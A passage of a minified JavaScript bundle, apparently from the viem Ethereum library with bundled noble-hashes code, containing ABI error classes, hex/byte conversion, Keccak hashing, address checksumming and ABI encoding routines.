`);super(o,r.cause?{cause:r.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=n,this.docsPath=i,this.metaMessages=r.metaMessages,this.name=r.name??this.name,this.shortMessage=e,this.version=dI}walk(e){return fI(this,e)}};function fI(t,e){return e!=null&&e(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause!==void 0?fI(t.cause,e):e?null:t}class FF extends Y{constructor({docsPath:e}){super(["A constructor was not found on the ABI.","Make sure you are using the correct ABI and that the constructor exists on it."].join(`
`),{docsPath:e,name:"AbiConstructorNotFoundError"})}}class oE extends Y{constructor({docsPath:e}){super(["Constructor arguments were provided (`args`), but a constructor parameters (`inputs`) were not found on the ABI.","Make sure you are using the correct ABI, and that the `inputs` attribute on the constructor exists."].join(`
`),{docsPath:e,name:"AbiConstructorParamsNotFoundError"})}}class pI extends Y{constructor({data:e,params:r,size:n}){super([`Data size of ${n} bytes is too small for given parameters.`].join(`
`),{metaMessages:[`Params: (${$f(r,{includeName:!0})})`,`Data:   ${e} (${n} bytes)`],name:"AbiDecodingDataSizeTooSmallError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"params",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"size",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=e,this.params=r,this.size=n}}class Lf extends Y{constructor(){super('Cannot decode zero data ("0x") with ABI parameters.',{name:"AbiDecodingZeroDataError"})}}class jF extends Y{constructor({expectedLength:e,givenLength:r,type:n}){super([`ABI encoding array length mismatch for type ${n}.`,`Expected length: ${e}`,`Given length: ${r}`].join(`
`),{name:"AbiEncodingArrayLengthMismatchError"})}}class qF extends Y{constructor({expectedSize:e,value:r}){super(`Size of bytes "${r}" (bytes${Ir(r)}) does not match expected size (bytes${e}).`,{name:"AbiEncodingBytesSizeMismatchError"})}}class zF extends Y{constructor({expectedLength:e,givenLength:r}){super(["ABI encoding params/values length mismatch.",`Expected length (params): ${e}`,`Given length (values): ${r}`].join(`
`),{name:"AbiEncodingLengthMismatchError"})}}class HF extends Y{constructor(e,{docsPath:r}){super([`Arguments (\`args\`) were provided to "${e}", but "${e}" on the ABI does not contain any parameters (\`inputs\`).`,"Cannot encode error result without knowing what the parameter types are.","Make sure you are using the correct ABI and that the inputs exist on it."].join(`
`),{docsPath:r,name:"AbiErrorInputsNotFoundError"})}}class aE extends Y{constructor(e,{docsPath:r}={}){super([`Error ${e?`"${e}" `:""}not found on ABI.`,"Make sure you are using the correct ABI and that the error exists on it."].join(`
`),{docsPath:r,name:"AbiErrorNotFoundError"})}}class gI extends Y{constructor(e,{docsPath:r}){super([`Encoded error signature "${e}" not found on ABI.`,"Make sure you are using the correct ABI and that the error exists on it.",`You can look up the decoded signature here: https://openchain.xyz/signatures?query=${e}.`].join(`
`),{docsPath:r,name:"AbiErrorSignatureNotFoundError"}),Object.defineProperty(this,"signature",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.signature=e}}class WF extends Y{constructor({docsPath:e}){super("Cannot extract event signature from empty topics.",{docsPath:e,name:"AbiEventSignatureEmptyTopicsError"})}}class mI extends Y{constructor(e,{docsPath:r}){super([`Encoded event signature "${e}" not found on ABI.`,"Make sure you are using the correct ABI and that the event exists on it.",`You can look up the signature here: https://openchain.xyz/signatures?query=${e}.`].join(`
`),{docsPath:r,name:"AbiEventSignatureNotFoundError"})}}class vc extends Y{constructor(e,{docsPath:r}={}){super([`Function ${e?`"${e}" `:""}not found on ABI.`,"Make sure you are using the correct ABI and that the function exists on it."].join(`
`),{docsPath:r,name:"AbiFunctionNotFoundError"})}}class yI extends Y{constructor(e,{docsPath:r}){super([`Function "${e}" does not contain any \`outputs\` on ABI.`,"Cannot decode function result without knowing what the parameter types are.","Make sure you are using the correct ABI and that the function exists on it."].join(`
`),{docsPath:r,name:"AbiFunctionOutputsNotFoundError"})}}class GF extends Y{constructor(e,{docsPath:r}){super([`Encoded function signature "${e}" not found on ABI.`,"Make sure you are using the correct ABI and that the function exists on it.",`You can look up the signature here: https://openchain.xyz/signatures?query=${e}.`].join(`
`),{docsPath:r,name:"AbiFunctionSignatureNotFoundError"})}}class VF extends Y{constructor(e,r){super("Found ambiguous types in overloaded ABI items.",{metaMessages:[`\`${e.type}\` in \`${Fi(e.abiItem)}\`, and`,`\`${r.type}\` in \`${Fi(r.abiItem)}\``,"","These types encode differently and cannot be distinguished at runtime.","Remove one of the ambiguous items in the ABI."],name:"AbiItemAmbiguityError"})}}class o0 extends Y{constructor({abiItem:e,data:r,params:n,size:i}){super([`Data size of ${i} bytes is too small for non-indexed event parameters.`].join(`
`),{metaMessages:[`Params: (${$f(n,{includeName:!0})})`,`Data:   ${r} (${i} bytes)`],name:"DecodeLogDataMismatch"}),Object.defineProperty(this,"abiItem",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"params",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"size",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abiItem=e,this.data=r,this.params=n,this.size=i}}class wI extends Y{constructor({abiItem:e,param:r}){super([`Expected a topic for indexed event parameter${r.name?` "${r.name}"`:""} on event "${Fi(e,{includeName:!0})}".`].join(`
`),{name:"DecodeLogTopicsMismatch"}),Object.defineProperty(this,"abiItem",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abiItem=e}}class KF extends Y{constructor(e,{docsPath:r}){super([`Type "${e}" is not a valid encoding type.`,"Please provide a valid ABI type."].join(`
`),{docsPath:r,name:"InvalidAbiEncodingType"})}}class QF extends Y{constructor(e,{docsPath:r}){super([`Type "${e}" is not a valid decoding type.`,"Please provide a valid ABI type."].join(`
`),{docsPath:r,name:"InvalidAbiDecodingType"})}}class bI extends Y{constructor(e){super([`Value "${e}" is not a valid array.`].join(`
`),{name:"InvalidArrayError"})}}class YF extends Y{constructor(e){super([`"${e}" is not a valid definition type.`,'Valid types: "function", "event", "error"'].join(`
`),{name:"InvalidDefinitionTypeError"})}}class vI extends Y{constructor({offset:e,position:r,size:n}){super(`Slice ${r==="start"?"starting":"ending"} at offset "${e}" is out-of-bounds (size: ${n}).`,{name:"SliceOffsetOutOfBoundsError"})}}class EI extends Y{constructor({size:e,targetSize:r,type:n}){super(`${n.charAt(0).toUpperCase()}${n.slice(1).toLowerCase()} size (${e}) exceeds padding size (${r}).`,{name:"SizeExceedsPaddingSizeError"})}}class cE extends Y{constructor({size:e,targetSize:r,type:n}){super(`${n.charAt(0).toUpperCase()}${n.slice(1).toLowerCase()} is expected to be ${r} ${n} long, but is ${e} ${n} long.`,{name:"InvalidBytesLengthError"})}}function qc(t,{dir:e,size:r=32}={}){return typeof t=="string"?Zs(t,{dir:e,size:r}):JF(t,{dir:e,size:r})}function Zs(t,{dir:e,size:r=32}={}){if(r===null)return t;const n=t.replace("0x","");if(n.length>r*2)throw new EI({size:Math.ceil(n.length/2),targetSize:r,type:"hex"});return`0x${n[e==="right"?"padEnd":"padStart"](r*2,"0")}`}function JF(t,{dir:e,size:r=32}={}){if(r===null)return t;if(t.length>r)throw new EI({size:t.length,targetSize:r,type:"bytes"});const n=new Uint8Array(r);for(let i=0;i<r;i++){const s=e==="right";n[s?i:r-i-1]=t[s?i:t.length-i-1]}return n}class AI extends Y{constructor({max:e,min:r,signed:n,size:i,value:s}){super(`Number "${s}" is not in safe ${i?`${i*8}-bit ${n?"signed":"unsigned"} `:""}integer range ${e?`(${r} to ${e})`:`(above ${r})`}`,{name:"IntegerOutOfRangeError"})}}class ZF extends Y{constructor(e){super(`Bytes value "${e}" is not a valid boolean. The bytes array must contain a single byte of either a 0 or 1 value.`,{name:"InvalidBytesBooleanError"})}}class XF extends Y{constructor({givenSize:e,maxSize:r}){super(`Size cannot exceed ${r} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}}function zc(t,{dir:e="left"}={}){let r=typeof t=="string"?t.replace("0x",""):t,n=0;for(let i=0;i<r.length-1&&r[e==="left"?i:r.length-i-1].toString()==="0";i++)n++;return r=e==="left"?r.slice(n):r.slice(0,r.length-n),typeof t=="string"?(r.length===1&&e==="right"&&(r=`${r}0`),`0x${r.length%2===1?`0${r}`:r}`):r}function bi(t,{size:e}){if(Ir(t)>e)throw new XF({givenSize:Ir(t),maxSize:e})}function Ec(t,e={}){const{signed:r}=e;e.size&&bi(t,{size:e.size});const n=BigInt(t);if(!r)return n;const i=(t.length-2)/2,s=(1n<<BigInt(i)*8n-1n)-1n;return n<=s?n:n-BigInt(`0x${"f".padStart(i*2,"f")}`)-1n}function ia(t,e={}){return Number(Ec(t,e))}function _I(t,e={}){let r=ji(t);return e.size&&(bi(r,{size:e.size}),r=zc(r,{dir:"right"})),new TextDecoder().decode(r)}const e9=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function bs(t,e={}){return typeof t=="number"||typeof t=="bigint"?Ue(t,e):typeof t=="string"?Ff(t,e):typeof t=="boolean"?CI(t,e):Dr(t,e)}function CI(t,e={}){const r=`0x${Number(t)}`;return typeof e.size=="number"?(bi(r,{size:e.size}),qc(r,{size:e.size})):r}function Dr(t,e={}){let r="";for(let i=0;i<t.length;i++)r+=e9[t[i]];const n=`0x${r}`;return typeof e.size=="number"?(bi(n,{size:e.size}),qc(n,{dir:"right",size:e.size})):n}function Ue(t,e={}){const{signed:r,size:n}=e,i=BigInt(t);let s;n?r?s=(1n<<BigInt(n)*8n-1n)-1n:s=2n**(BigInt(n)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&r?-s-1n:0;if(s&&i>s||i<o){const c=typeof t=="bigint"?"n":"";throw new AI({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:r,size:n,value:`${t}${c}`})}const a=`0x${(r&&i<0?(1n<<BigInt(n*8))+BigInt(i):i).toString(16)}`;return n?qc(a,{size:n}):a}const t9=new TextEncoder;function Ff(t,e={}){const r=t9.encode(t);return Dr(r,e)}const r9=new TextEncoder;function sh(t,e={}){return typeof t=="number"||typeof t=="bigint"?i9(t,e):typeof t=="boolean"?n9(t,e):ws(t)?ji(t,e):Vo(t,e)}function n9(t,e={}){const r=new Uint8Array(1);return r[0]=Number(t),typeof e.size=="number"?(bi(r,{size:e.size}),qc(r,{size:e.size})):r}const is={zero:48,nine:57,A:65,F:70,a:97,f:102};function uE(t){if(t>=is.zero&&t<=is.nine)return t-is.zero;if(t>=is.A&&t<=is.F)return t-(is.A-10);if(t>=is.a&&t<=is.f)return t-(is.a-10)}function ji(t,e={}){let r=t;e.size&&(bi(r,{size:e.size}),r=qc(r,{dir:"right",size:e.size}));let n=r.slice(2);n.length%2&&(n=`0${n}`);const i=n.length/2,s=new Uint8Array(i);for(let o=0,a=0;o<i;o++){const c=uE(n.charCodeAt(a++)),u=uE(n.charCodeAt(a++));if(c===void 0||u===void 0)throw new Y(`Invalid byte sequence ("${n[a-2]}${n[a-1]}" in "${n}").`);s[o]=c*16+u}return s}function i9(t,e){const r=Ue(t,e);return ji(r)}function Vo(t,e={}){const r=r9.encode(t);return typeof e.size=="number"?(bi(r,{size:e.size}),qc(r,{dir:"right",size:e.size})):r}function Bd(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function s9(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function jf(t,...e){if(!s9(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function cJ(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");Bd(t.outputLen),Bd(t.blockLen)}function Ud(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function II(t,e){jf(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const Fh=BigInt(2**32-1),lE=BigInt(32);function o9(t,e=!1){return e?{h:Number(t&Fh),l:Number(t>>lE&Fh)}:{h:Number(t>>lE&Fh)|0,l:Number(t&Fh)|0}}function a9(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=o9(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const c9=(t,e,r)=>t<<r|e>>>32-r,u9=(t,e,r)=>e<<r|t>>>32-r,l9=(t,e,r)=>e<<r-32|t>>>64-r,h9=(t,e,r)=>t<<r-32|e>>>64-r,Ha=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function d9(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function yg(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function Ci(t,e){return t<<32-e|t>>>e}const hE=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function f9(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function dE(t){for(let e=0;e<t.length;e++)t[e]=f9(t[e])}function p9(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function py(t){return typeof t=="string"&&(t=p9(t)),jf(t),t}function uJ(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];jf(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}class xI{clone(){return this._cloneInto()}}function SI(t){const e=n=>t().update(py(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function lJ(t=32){if(Ha&&typeof Ha.getRandomValues=="function")return Ha.getRandomValues(new Uint8Array(t));if(Ha&&typeof Ha.randomBytes=="function")return Ha.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const NI=[],TI=[],PI=[],g9=BigInt(0),hu=BigInt(1),m9=BigInt(2),y9=BigInt(7),w9=BigInt(256),b9=BigInt(113);for(let t=0,e=hu,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],NI.push(2*(5*n+r)),TI.push((t+1)*(t+2)/2%64);let i=g9;for(let s=0;s<7;s++)e=(e<<hu^(e>>y9)*b9)%w9,e&m9&&(i^=hu<<(hu<<BigInt(s))-hu);PI.push(i)}const[v9,E9]=a9(PI,!0),fE=(t,e,r)=>r>32?l9(t,e,r):c9(t,e,r),pE=(t,e,r)=>r>32?h9(t,e,r):u9(t,e,r);function A9(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let o=0;o<10;o++)r[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,u=r[c],l=r[c+1],h=fE(u,l,1)^r[a],d=pE(u,l,1)^r[a+1];for(let g=0;g<50;g+=10)t[o+g]^=h,t[o+g+1]^=d}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=TI[o],c=fE(i,s,a),u=pE(i,s,a),l=NI[o];i=t[l],s=t[l+1],t[l]=c,t[l+1]=u}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)r[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~r[(a+2)%10]&r[(a+4)%10]}t[0]^=v9[n],t[1]^=E9[n]}r.fill(0)}class gy extends xI{constructor(e,r,n,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=r,this.outputLen=n,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,Bd(n),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=d9(this.state)}keccak(){hE||dE(this.state32),A9(this.state32,this.rounds),hE||dE(this.state32),this.posOut=0,this.pos=0}update(e){Ud(this);const{blockLen:r,state:n}=this;e=py(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);for(let a=0;a<o;a++)n[this.pos++]^=e[s++];this.pos===r&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:r,pos:n,blockLen:i}=this;e[n]^=r,(r&128)!==0&&n===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Ud(this,!1),jf(e),this.finish();const r=this.state,{blockLen:n}=this;for(let i=0,s=e.length;i<s;){this.posOut>=n&&this.keccak();const o=Math.min(n-this.posOut,s-i);e.set(r.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return Bd(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(II(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:r,suffix:n,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new gy(r,n,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=n,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}}const _9=(t,e,r)=>SI(()=>new gy(e,t,r)),C9=_9(1,136,256/8);function no(t,e){const r=e||"hex",n=C9(ws(t,{strict:!1})?sh(t):t);return r==="bytes"?n:bs(n)}const I9=t=>no(sh(t));function x9(t){return I9(t)}function S9(t){let e=!0,r="",n=0,i="",s=!1;for(let o=0;o<t.length;o++){const a=t[o];if(["(",")",","].includes(a)&&(e=!0),a==="("&&n++,a===")"&&n--,!!e){if(n===0){if(a===" "&&["event","function",""].includes(i))i="";else if(i+=a,a===")"){s=!0;break}continue}if(a===" "){t[o-1]!==","&&r!==","&&r!==",("&&(r="",e=!1);continue}i+=a,r+=a}}if(!s)throw new Y("Unable to normalize signature.");return i}const N9=t=>{const e=typeof t=="string"?t:z3(t);return S9(e)};function RI(t){return x9(N9(t))}const my=RI;class sa extends Y{constructor({address:e}){super(`Address "${e}" is invalid.`,{metaMessages:["- Address must be a hex value of 20 bytes (40 hex characters).","- Address must match its checksum counterpart."],name:"InvalidAddressError"})}}class qf extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const r=super.get(e);return super.has(e)&&r!==void 0&&(this.delete(e),super.set(e,r)),r}set(e,r){if(super.set(e,r),this.maxSize&&this.size>this.maxSize){const n=this.keys().next().value;n&&this.delete(n)}return this}}const wg=new qf(8192);function zf(t,e){if(wg.has(`${t}.${e}`))return wg.get(`${t}.${e}`);const r=e?`${e}${t.toLowerCase()}`:t.substring(2).toLowerCase(),n=no(Vo(r),"bytes"),i=(e?r.substring(`${e}0x`.length):r).split("");for(let o=0;o<40;o+=2)n[o>>1]>>4>=8&&i[o]&&(i[o]=i[o].toUpperCase()),(n[o>>1]&15)>=8&&i[o+1]&&(i[o+1]=i[o+1].toUpperCase());const s=`0x${i.join("")}`;return wg.set(`${t}.${e}`,s),s}function Lo(t,e){if(!qi(t,{strict:!1}))throw new sa({address:t});return zf(t,e)}const T9=/^0x[a-fA-F0-9]{40}$/,bg=new qf(8192);function qi(t,e){const{strict:r=!0}=e??{},n=`${t}.${r}`;if(bg.has(n))return bg.get(n);const i=T9.test(t)?t.toLowerCase()===t?!0:r?zf(t)===t:!0:!1;return bg.set(n,i),i}function oa(t){return typeof t[0]=="string"?oh(t):P9(t)}function P9(t){let e=0;for(const i of t)e+=i.length;const r=new Uint8Array(e);let n=0;for(const i of t)r.set(i,n),n+=i.length;return r}function oh(t){return`0x${t.reduce((e,r)=>e+r.replace("0x",""),"")}`}function Ac(t,e,r,{strict:n}={}){return ws(t,{strict:!1})?R9(t,e,r,{strict:n}):DI(t,e,r,{strict:n})}function OI(t,e){if(typeof e=="number"&&e>0&&e>Ir(t)-1)throw new vI({offset:e,position:"start",size:Ir(t)})}function kI(t,e,r){if(typeof e=="number"&&typeof r=="number"&&Ir(t)!==r-e)throw new vI({offset:r,position:"end",size:Ir(t)})}function DI(t,e,r,{strict:n}={}){OI(t,e);const i=t.slice(e,r);return n&&kI(i,e,r),i}function R9(t,e,r,{strict:n}={}){OI(t,e);const i=`0x${t.replace("0x","").slice((e??0)*2,(r??t.length)*2)}`;return n&&kI(i,e,r),i}const O9=/^(u?int)(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/;function Hf(t,e){if(t.length!==e.length)throw new zF({expectedLength:t.length,givenLength:e.length});const r=k9({params:t,values:e}),n=wy(r);return n.length===0?"0x":n}function k9({params:t,values:e}){const r=[];for(let n=0;n<t.length;n++)r.push(yy({param:t[n],value:e[n]}));return r}function yy({param:t,value:e}){const r=by(t.type);if(r){const[n,i]=r;return M9(e,{length:n,param:{...t,type:i}})}if(t.type==="tuple")return F9(e,{param:t});if(t.type==="address")return D9(e);if(t.type==="bool")return U9(e);if(t.type.startsWith("uint")||t.type.startsWith("int")){const n=t.type.startsWith("int"),[,,i="256"]=O9.exec(t.type)??[];return $9(e,{signed:n,size:Number(i)})}if(t.type.startsWith("bytes"))return B9(e,{param:t});if(t.type==="string")return L9(e);throw new KF(t.type,{docsPath:"/docs/contract/encodeAbiParameters"})}function wy(t){let e=0;for(let s=0;s<t.length;s++){const{dynamic:o,encoded:a}=t[s];o?e+=32:e+=Ir(a)}const r=[],n=[];let i=0;for(let s=0;s<t.length;s++){const{dynamic:o,encoded:a}=t[s];o?(r.push(Ue(e+i,{size:32})),n.push(a),i+=Ir(a)):r.push(a)}return oa([...r,...n])}function D9(t){if(!qi(t))throw new sa({address:t});return{dynamic:!1,encoded:Zs(t.toLowerCase())}}function M9(t,{length:e,param:r}){const n=e===null;if(!Array.isArray(t))throw new bI(t);if(!n&&t.length!==e)throw new jF({expectedLength:e,givenLength:t.length,type:`${r.type}[${e}]`});let i=!1;const s=[];for(let o=0;o<t.length;o++){const a=yy({param:r,value:t[o]});a.dynamic&&(i=!0),s.push(a)}if(n||i){const o=wy(s);if(n){const a=Ue(s.length,{size:32});return{dynamic:!0,encoded:s.length>0?oa([a,o]):a}}if(i)return{dynamic:!0,encoded:o}}return{dynamic:!1,encoded:oa(s.map(({encoded:o})=>o))}}function B9(t,{param:e}){const[,r]=e.type.split("bytes"),n=Ir(t);if(!r){let i=t;return n%32!==0&&(i=Zs(i,{dir:"right",size:Math.ceil((t.length-2)/2/32)*32})),{dynamic:!0,encoded:oa([Zs(Ue(n,{size:32})),i])}}if(n!==Number.parseInt(r))throw new qF({expectedSize:Number.parseInt(r),value:t});return{dynamic:!1,encoded:Zs(t,{dir:"right"})}}function U9(t){if(typeof t!="boolean")throw new Y(`Invalid boolean value: "${t}" (type: ${typeof t}). Expected: \`true\` or \`false\`.`);return{dynamic:!1,encoded:Zs(CI(t))}}function $9(t,{signed:e,size:r=256}){if(typeof r=="number"){const n=2n**(BigInt(r)-(e?1n:0n))-1n,i=e?-n-1n:0n;if(t>n||t<i)throw new AI({max:n.toString(),min:i.toString(),signed:e,size:r/8,value:t.toString()})}return{dynamic:!1,encoded:Ue(t,{size:32,signed:e})}}function L9(t){const e=Ff(t),r=Math.ceil(Ir(e)/32),n=[];for(let i=0;i<r;i++)n.push(Zs(Ac(e,i*32,(i+1)*32),{dir:"right"}));return{dynamic:!0,encoded:oa([Zs(Ue(Ir(e),{size:32})),...n])}}function F9(t,{param:e}){let r=!1;const n=[];for(let i=0;i<e.components.length;i++){const s=e.components[i],o=Array.isArray(t)?i:s.name,a=yy({param:s,value:t[o]});n.push(a),a.dynamic&&(r=!0)}return{dynamic:r,encoded:r?wy(n):oa(n.map(({encoded:i})=>i))}}function by(t){const e=t.match(/^(.*)\[(\d+)?\]$/);return e?[e[2]?Number(e[2]):null,e[1]]:void 0}const ah=t=>Ac(RI(t),0,4);function ch(t){const{abi:e,args:r=[],name:n}=t,i=ws(n,{strict:!1}),s=e.filter(a=>i?a.type==="function"?ah(a)===n:a.type==="event"?my(a)===n:!1:"name"in a&&a.name===n);if(s.length===0)return;if(s.length===1)return s[0];let o;for(const a of s){if(!("inputs"in a))continue;if(!r||r.length===0){if(!a.inputs||a.inputs.length===0)return a;continue}if(!a.inputs||a.inputs.length===0||a.inputs.length!==r.length)continue;if(r.every((u,l)=>{const h="inputs"in a&&a.inputs[l];return h?a0(u,h):!1})){if(o&&"inputs"in o&&o.inputs){const u=MI(a.inputs,o.inputs,r);if(u)throw new VF({abiItem:a,type:u[0]},{abiItem:o,type:u[1]})}o=a}}return o||s[0]}function a0(t,e){const r=typeof t,n=e.type;switch(n){case"address":return qi(t,{strict:!1});case"bool":return r==="boolean";case"function":return r==="string";case"string":return r==="string";default:return n==="tuple"&&"components"in e?Object.values(e.components).every((i,s)=>a0(Object.values(t)[s],i)):/^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/.test(n)?r==="number"||r==="bigint":/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/.test(n)?r==="string"||t instanceof Uint8Array:/[a-z]+[1-9]{0,3}(\[[0-9]{0,}\])+$/.test(n)?Array.isArray(t)&&t.every(i=>a0(i,{...e,type:n.replace(/(\[[0-9]{0,}\])$/,"")})):!1}}function MI(t,e,r){for(const n in t){const i=t[n],s=e[n];if(i.type==="tuple"&&s.type==="tuple"&&"components"in i&&"components"in s)return MI(i.components,s.components,r[n]);const o=[i.type,s.type];if(o.includes("address")&&o.includes("bytes20")?!0:o.includes("address")&&o.includes("string")?qi(r[n],{strict:!1}):o.includes("address")&&o.includes("bytes")?qi(r[n],{strict:!1}):!1)return o}}function j9(t,{method:e}){var n,i;const r={};return t.transport.type==="fallback"&&((i=(n=t.transport).onResponse)==null||i.call(n,({method:s,response:o,status:a,transport:c})=>{a==="success"&&e===s&&(r[o]=c.request)})),s=>r[s]||t.request}function Vi(t){return typeof t=="string"?{address:t,type:"json-rpc"}:t}const gE="/docs/contract/encodeFunctionData";function q9(t){const{abi:e,args:r,functionName:n}=t;let i=e[0];if(n){const s=ch({abi:e,args:r,name:n});if(!s)throw new vc(n,{docsPath:gE});i=s}if(i.type!=="function")throw new vc(void 0,{docsPath:gE});return{abi:[i],functionName:ah(Fi(i))}}function Hc(t){const{args:e}=t,{abi:r,functionName:n}=(()=>{var a;return t.abi.length===1&&((a=t.functionName)!=null&&a.startsWith("0x"))?t:q9(t)})(),i=r[0],s=n,o="inputs"in i&&i.inputs?Hf(i.inputs,e??[]):void 0;return oh([s,o??"0x"])}const BI={1:"An `assert` condition failed.",17:"Arithmetic operation resulted in underflow or overflow.",18:"Division or modulo by zero (e.g. `5 / 0` or `23 % 0`).",33:"Attempted to convert to an invalid type.",34:"Attempted to access a storage byte array that is incorrectly encoded.",49:"Performed `.pop()` on an empty array",50:"Array index is out of bounds.",65:"Allocated too much memory or created an array which is too large.",81:"Attempted to call a zero-initialized variable of internal function type."},UI={inputs:[{name:"message",type:"string"}],name:"Error",type:"error"},z9={inputs:[{name:"reason",type:"uint256"}],name:"Panic",type:"error"};class mE extends Y{constructor({offset:e}){super(`Offset \`${e}\` cannot be negative.`,{name:"NegativeOffsetError"})}}class $I extends Y{constructor({length:e,position:r}){super(`Position \`${r}\` is out of bounds (\`0 < position < ${e}\`).`,{name:"PositionOutOfBoundsError"})}}class H9 extends Y{constructor({count:e,limit:r}){super(`Recursive read limit of \`${r}\` exceeded (recursive read count: \`${e}\`).`,{name:"RecursiveReadLimitExceededError"})}}const W9={bytes:new Uint8Array,dataView:new DataView(new ArrayBuffer(0)),position:0,positionReadCount:new Map,recursiveReadCount:0,recursiveReadLimit:Number.POSITIVE_INFINITY,assertReadLimit(){if(this.recursiveReadCount>=this.recursiveReadLimit)throw new H9({count:this.recursiveReadCount+1,limit:this.recursiveReadLimit})},assertPosition(t){if(t<0||t>this.bytes.length-1)throw new $I({length:this.bytes.length,position:t})},decrementPosition(t){if(t<0)throw new mE({offset:t});const e=this.position-t;this.assertPosition(e),this.position=e},getReadCount(t){return this.positionReadCount.get(t||this.position)||0},incrementPosition(t){if(t<0)throw new mE({offset:t});const e=this.position+t;this.assertPosition(e),this.position=e},inspectByte(t){const e=t??this.position;return this.assertPosition(e),this.bytes[e]},inspectBytes(t,e){const r=e??this.position;return this.assertPosition(r+t-1),this.bytes.subarray(r,r+t)},inspectUint8(t){const e=t??this.position;return this.assertPosition(e),this.bytes[e]},inspectUint16(t){const e=t??this.position;return this.assertPosition(e+1),this.dataView.getUint16(e)},inspectUint24(t){const e=t??this.position;return this.assertPosition(e+2),(this.dataView.getUint16(e)<<8)+this.dataView.getUint8(e+2)},inspectUint32(t){const e=t??this.position;return 